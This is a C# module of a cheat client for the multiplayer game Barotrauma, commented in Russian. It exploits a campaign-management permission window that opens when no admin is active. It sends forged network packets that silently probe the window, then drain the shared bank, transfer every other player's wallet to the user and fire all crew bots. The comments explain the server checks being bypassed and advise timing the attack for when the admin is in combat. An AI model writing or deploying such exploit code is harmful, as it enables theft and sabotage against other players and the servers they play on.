using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  CAMPAIGN HIJACK (волна 587, вектор 586)
    //  Автоматизатор окна «AnyOneAllowedToManageCampaign»:
    //  в раунде после 60й секунды, пока НИ ОДИН перм-холдер
    //  (хост/админ) не в состоянии InGame && !IsIncapacitated && !IsDead,
    //  сервер считает КАЖДОГО клиента менеджером кампании.
    //  = каждая смерть/ступор админа = окно.
    //
    //  ПРОБА: TRANSFER_MONEY Sender=None Receiver=я Amount=(cap+1).
    //  Кап (MaximumMoneyTransferRequest) применяется ТОЛЬКО к не-менеджерам
    //  (MultiPlayerCampaign:1199). Если баланс прыгнул на cap+1 — окно ОТКРЫТО
    //  (менеджерский путь исполняет ЛЮБОЙ amount из банка).
    //  Отказ сервера молчалив (return) — проба бесплатна.
    //
    //  В окне доступно (кнопки):
    //   • СЛИТЬ БАНК — Amount = Bank.Balance (синк-копия на клиенте)
    //   • СВИП КОШЕЛЬКОВ — Sender=Some(жертва) требует менеджера (server:1186):
    //     кошелёк жертвы → TryDeduct → мне. Amount = жертва.Wallet.Balance.
    //   • УВОЛИТЬ БОТОВ — CREW fireCharacter по каждому боту (ManageHires-ветка
    //     открывается тем же окном; нужна близость к crew NPC на субе).
    //
    //  Все гейты сервера: AllowedToManageWallets/AllowedToManageCampaign =
    //  AllowedToManageCampaign → HasPermission || ManageCampaign || IsOwner
    //  || AnyOneAllowedToManageCampaign (CampaignMode.cs:18-229).
    // ============================================================
    public class CampaignHijackModule : CSModuleBase
    {
        public override string Id   => "campaign_hijack";
        public override string Name => "Campaign Hijack";
        public override string Description =>
            "Окно «мёртвого админа» (586).\n\n" +
            "• PROBE — тихая проба окна (перевод cap+1 из банка)\n" +
            "• СЛИТЬ БАНК — весь баланс банка себе (БЕЗ капа)\n" +
            "• СВИП — кошельки всех игроков себе\n" +
            "• УВОЛИТЬ БОТОВ — fire всех ботов экипажа\n\n" +
            "Окно ОТКРЫТО когда админ мёртв/в ступоре/не в игре\n" +
            "и раунд идёт дольше 60с. Проба безвредна (отказ = тишина).\n" +
            "Держи наготове, когда админ полез в драку.";

        private static readonly Color AccentColor = new Color(255, 170, 90);
        private static readonly Color OkColor     = new Color(120, 255, 140);
        private static readonly Color ErrColor    = new Color(255, 110, 110);

        public override string GetLabel() => "Campaign Hijack 👑";
        public override string Category => "exploit";

        public override void OnClick()
        {
            if (GameMain.Client == null || GameMain.GameSession?.Campaign == null)
            {
                GUI.AddMessage("[Hijack] Нужна кампания", ErrColor);
                return;
            }
            GUI.AddMessage("[Hijack] PROBE → при открытом окне: банк+кошельки+боты", AccentColor);
            CoroutineManager.StartCoroutine(HijackSequence());
        }

        // ------------------------------------------------------------
        //  PROBE: cap+1 из банка себе. Баланс-дельта = вердикт.
        //  Окно открыто → полный цикл: слив банка, свип кошельков, fire ботов.
        // ------------------------------------------------------------
        private static IEnumerable<CoroutineStatus> HijackSequence()
        {
            Character me = Character.Controlled;
            if (me == null) { yield break; }

            int cap = 999999;
            try { cap = GameMain.Client.ServerSettings.MaximumMoneyTransferRequest; } catch { }
            int probeAmount = cap + 1;

            int before = me.Wallet.Balance;
            SendTransfer(senderCharId: null, receiverCharId: me.ID, amount: probeAmount);
            GUI.AddMessage("[Hijack] проба: прошу " + probeAmount + " мк из банка...", AccentColor);

            // ждём ответный NetWalletUpdate (Reliable + тик сервера)
            double until = Timing.TotalTime + 3.0;
            while (Timing.TotalTime < until) { yield return CoroutineStatus.Running; }

            Character me2 = Character.Controlled;
            if (me2 == null) { yield break; }
            int delta = me2.Wallet.Balance - before;

            if (delta >= probeAmount)
            {
                GUI.AddMessage("[Hijack] ★ ОКНО ОТКРЫТО (+" + delta + ") — добиваю", OkColor);
                DrainBank();
                SweepWallets();
                FireAllBots();
            }
            else if (delta > 0)
            {
                GUI.AddMessage("[Hijack] кап применён (+" + delta + ") — окна нет", ErrColor);
            }
            else
            {
                GUI.AddMessage("[Hijack] тишина — окна нет (или банк пуст)", ErrColor);
            }
            yield return CoroutineStatus.Success;
        }

        // ------------------------------------------------------------
        //  Кнопки вызываются из меню-оверлея через модальный GUI
        //  (клик по модулю повторно = повторная проба).
        //  Здесь: публичные точки входа для биндов/хоткеев CSHUB.
        // ------------------------------------------------------------
        public static void DrainBank()
        {
            var camp = GameMain.GameSession?.Campaign;
            if (camp == null) { return; }
            int bank = camp.Bank.Balance;
            if (bank <= 0)
            {
                GUI.AddMessage("[Hijack] банк пуст", ErrColor);
                return;
            }
            Character me = Character.Controlled;
            if (me == null) { return; }
            SendTransfer(null, me.ID, bank);
            GUI.AddMessage("[Hijack] слив банка: " + bank + " мк → тебе", AccentColor);
        }

        public static void SweepWallets()
        {
            Character me = Character.Controlled;
            if (me == null) { return; }
            int sent = 0;
            var done = new HashSet<ushort>();
            foreach (Character ch in Character.CharacterList)
            {
                if (ch == null || ch.Removed || ch == me) { continue; }
                if (ch.IsBot || ch.IsDead || ch.TeamID != CharacterTeamType.Team1) { continue; }
                if (!done.Add(ch.ID)) { continue; }
                int bal = ch.Wallet.Balance;
                if (bal <= 0) { continue; }
                SendTransfer(ch.ID, me.ID, bal);
                sent++;
                GUI.AddMessage("[Hijack] " + ch.Name + ": кошелёк " + bal + " мк → мне", AccentColor);
            }
            if (sent == 0) { GUI.AddMessage("[Hijack] чужие кошельки пусты/нет игроков", ErrColor); }
        }

        public static void FireAllBots()
        {
            int fired = 0;
            var done = new HashSet<ushort>();
            foreach (Character ch in Character.CharacterList)
            {
                if (ch == null || ch.Removed) { continue; }
                if (!ch.IsBot || ch.IsDead || ch.TeamID != CharacterTeamType.Team1) { continue; }
                if (ch.Info == null || !done.Add(ch.Info.ID)) { continue; }
                SendFireCrew(ch.Info.ID);
                fired++;
            }
            GUI.AddMessage(fired > 0
                ? "[Hijack] CREW fire отправлен: " + fired + " бот(ов) (нужна близость к crew NPC)"
                : "[Hijack] ботов не найдено", fired > 0 ? AccentColor : ErrColor);
        }

        // ------------------------------------------------------------
        //  TRANSFER_MONEY: NetWalletTransfer{Sender, Receiver, Amount}
        //  Битфилд Option-ов: [Sender Some?] [Receiver Some?], потом тело
        //  в порядке объявления полей. (зеркало MoneyTransferModule:239)
        // ------------------------------------------------------------
        private static void SendTransfer(ushort? senderCharId, ushort? receiverCharId, int amount)
        {
            try
            {
                IWriteMessage body = new WriteOnlyMessage();
                if (senderCharId.HasValue) { body.WriteUInt16(senderCharId.Value); }
                if (receiverCharId.HasValue) { body.WriteUInt16(receiverCharId.Value); }
                body.WriteInt32(amount);

                IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.TRANSFER_MONEY);
                var bf = new SimpleBitWriter();
                bf.WriteBoolean(senderCharId.HasValue);
                bf.WriteBoolean(receiverCharId.HasValue);
                bf.FlushTo(msg);
                msg.WriteBytes(body.Buffer, 0, body.LengthBytes);

                GameMain.Client?.ClientPeer?.Send(msg, DeliveryMethod.Reliable);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[Hijack] transfer fail: " + e.Message, ErrColor);
            }
        }

        // ------------------------------------------------------------
        //  CREW (ServerReadCrew): последовательность bool без битфилда:
        //  updatePending=false, validateHires=false, rename=false,
        //  fire=true, u16 firedIdentifier
        // ------------------------------------------------------------
        private static void SendFireCrew(ushort characterInfoId)
        {
            try
            {
                IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.CREW);
                msg.WriteBoolean(false);   // updatePending
                msg.WriteBoolean(false);   // validateHires
                msg.WriteBoolean(false);   // renameCharacter
                msg.WriteBoolean(true);    // fireCharacter
                msg.WriteUInt16(characterInfoId);
                GameMain.Client?.ClientPeer?.Send(msg, DeliveryMethod.Reliable);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[Hijack] crew fail: " + e.Message, ErrColor);
            }
        }
    }
}
